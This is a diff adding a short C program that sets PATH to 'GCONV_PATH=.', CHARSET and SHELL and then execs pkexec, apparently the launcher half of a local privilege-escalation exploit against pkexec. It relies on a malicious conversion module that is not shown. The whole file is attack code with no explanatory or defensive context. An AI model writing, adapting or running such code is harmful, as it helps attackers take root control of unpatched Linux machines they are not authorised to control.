@@ -1,0 +1,13 @@
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+char * const argv[] = { "pkexec", NULL };
+
+int main() {
+    setenv("PATH", "GCONV_PATH=.", 1);
+    setenv("CHARSET", "UTF-8", 1);
+    setenv("SHELL", "/bin/sh", 1);
+    execvp("pkexec", argv);
+    return 0;
+}
